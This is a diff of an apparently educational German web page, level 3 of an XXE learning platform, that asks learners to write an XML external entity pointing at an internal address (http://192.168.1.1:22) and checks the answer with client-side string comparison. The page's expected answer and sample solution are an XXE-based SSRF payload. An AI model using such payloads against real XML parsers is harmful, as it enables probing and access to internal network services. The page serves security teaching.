@@ -3,33 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XXE Lernplattform - Level 3</title>
+    <title>Level 3: SSRF Angriff mit XXE</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <!-- Punkteanzeige -->
+    <div id="scoreDisplay" style="position: fixed; top: 10px; right: 10px; background-color: #f9f9f9;
+        padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; font-weight: bold;">
+        Punkte: 0
+    </div>
+
     <h1>Level 3: SSRF Angriff mit XXE</h1>
-    <p>In diesem Level wirst du lernen, wie ein SSRF Angriff mithilfe von XXE funktioniert.</p>
+    <p>Definiere eine externe Entität, die auf eine URL verweist, um einen SSRF Angriff auszuführen.</p>
+    <p>In diesem Fall soll die URL: http://192.168.1.1:22 benutzt werden werden </p>
 
-    <h2>Deine Aufgabe</h2>
-    <p>Definiere eine externe Entität, die auf eine URL verweist, um einen SSRF Angriff auszuführen:</p>
-    <textarea id="xmlInput3" rows="10" cols="50" placeholder="Gib hier XML-Code ein"></textarea>
+    <!-- Aufgabe -->
+    <textarea id="xmlInput3" rows="10" cols="50">
+<!DOCTYPE networkscan [
+    <!-- Dein Code hier -->
+</textarea>
 
-    <!-- Tipps -->
-    <h3>Tipps</h3>
-    <button id="tip1">Tipp 1</button>
-    <button id="tip2">Tipp 2</button>
-    <button id="tip3">Tipp 3</button>
-    <div id="tip1-box" style="display:none;">Der SSRF Angriff nutzt externe URLs.</div>
-    <div id="tip2-box" style="display:none;">Syntax: <code>&lt;!ENTITY ssrf SYSTEM "URL"&gt;</code>.</div>
-    <div id="tip3-box" style="display:none;">Ziel ist <code>http://internal-system.local/admin</code>.</div>
-
-    <!-- Angriff starten -->
+    <!-- Buttons -->
     <button id="runAttackBtnLevel3">Angriff starten</button>
+    <button id="showSolutionBtn" style="margin-top: 10px; padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #ffc107; color: black; border: none; border-radius: 5px;">
+        Musterlösung anzeigen (Abzug: 100 Punkte)
+    </button>
+
+    <!-- Erklärung Button -->
+    <button id="toggleExplanationBtn" style="margin-top: 10px; padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px;">
+        Erklärung anzeigen
+    </button>
+    <div id="explanationContent" style="display: none; margin-top: 10px; padding: 10px; border: 1px solid #ccc; border-radius: 5px; background-color: #f9f9f9;">
+        <strong>Erklärung:</strong>
+        <p> Ein XXE-Angriff (XML External Entity) nutzt Schwachstellen in der Verarbeitung von XML-Daten aus, um unberechtigten Zugriff auf interne Ressourcen eines Systems zu erhalten.
+            Dabei wird eine sogenannte externe Entität in die XML-Daten eingefügt, die auf eine Ressource verweist, etwa eine Datei oder einen Netzwerkdienst.
+            Sobald das System die XML-Daten verarbeitet, versucht es, diese externe Entität aufzulösen und die angeforderte Ressource zu laden.
+            Dies kann dazu führen, dass vertrauliche Informationen preisgegeben oder unautorisierte Anfragen innerhalb des Netzwerks ausgeführt werden.
+            In diesem Fall könnte etwa ein Netzwerk-Scan oder eine Verbindung zu einem bestimmten Host erfolgen, wodurch der Angreifer interne Informationen über das Zielsystem erhält.
+        </p>
+    </div>
+
 
     <!-- Ergebnis -->
-    <h3>Ergebnisse:</h3>
-    <pre id="resultLevel3"></pre>
+    <textarea id="attackOutput" rows="5" cols="50" readonly></textarea>
 
-    <script src="script.js"></script>
+    <!-- Zurück -->
+    <button onclick="window.location.href='index.html'" style="margin-top: 20px; padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 5px;">
+        Zurück zur Hauptseite
+    </button>
+
+    <!-- Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            let score = localStorage.getItem('score') ? parseInt(localStorage.getItem('score')) : 0;
+
+            function updateScoreDisplay() {
+                const scoreDisplay = document.getElementById('scoreDisplay');
+                if (scoreDisplay) {
+                    scoreDisplay.textContent = `Punkte: ${score}`;
+                }
+            }
+
+            // Check if Level is already completed
+            const levelCompleted = localStorage.getItem('level3Completed') === 'true';
+            if (levelCompleted) {
+                document.getElementById('runAttackBtnLevel3').disabled = true;
+                document.getElementById('attackOutput').value = 'Level bereits abgeschlossen!';
+            }
+
+            // Angriff starten
+            document.getElementById('runAttackBtnLevel3').addEventListener('click', function () {
+                const userInput = document.getElementById('xmlInput3').value.trim();
+                const expectedInput = `
+<!DOCTYPE networkscan [
+  <!ENTITY scan SYSTEM "http://192.168.1.1:22">
+]>
+<data>&scan;</data>`.trim();
+
+                const attackOutput = document.getElementById('attackOutput');
+                if (userInput === expectedInput) {
+                    attackOutput.value = 'Erfolgreicher Angriff! SSRF Angriff ausgeführt. Verbindung zum internen Server hergestellt.';
+                    score += 100;
+                    localStorage.setItem('score', score);
+                    localStorage.setItem('level3Completed', 'true');
+                    localStorage.setItem('achievement3', 'true'); // Unlock Achievement
+                    document.getElementById('runAttackBtnLevel3').disabled = true;
+                } else {
+                    attackOutput.value = 'Fehler: Der Angriff war nicht erfolgreich.';
+                }
+                updateScoreDisplay();
+            });
+
+            // Musterlösung anzeigen
+            document.getElementById('showSolutionBtn').addEventListener('click', function () {
+                const solution = `
+<!DOCTYPE networkscan [
+  <!ENTITY scan SYSTEM "http://192.168.1.1:22">
+]>
+<data>&scan;</data>`;
+                document.getElementById('attackOutput').value = solution;
+                score = Math.max(0, score - 100);
+                localStorage.setItem('score', score);
+                updateScoreDisplay();
+            });
+
+            // Erklärung anzeigen/ausblenden
+            document.getElementById('toggleExplanationBtn').addEventListener('click', function () {
+                const explanation = document.getElementById('explanationContent');
+                explanation.style.display = explanation.style.display === 'none' ? 'block' : 'none';
+            });
+
+
+            updateScoreDisplay();
+        });
+    </script>
 </body>
 </html>
